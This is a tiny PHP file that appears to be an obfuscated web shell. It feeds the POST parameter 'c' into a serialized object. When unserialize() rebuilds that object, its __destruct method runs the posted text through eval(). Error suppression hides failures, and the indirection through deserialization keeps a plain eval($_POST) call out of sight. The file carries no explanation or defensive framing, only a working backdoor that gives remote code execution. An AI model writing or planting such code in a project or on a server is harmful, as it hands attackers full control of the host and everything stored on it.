<?php
class test{
    public $name = 'aaa';
    function __destruct()
    {
        @eval($this->name);
    }
}
$pwd = @$_POST['c'];
$lenpwd = strlen($pwd)+1;
$cont = "O:4:\"test\":1:{s:4:\"name\";s:".$lenpwd.":"."\"".$pwd.";"."\"".";}";
$t = unserialize($cont);
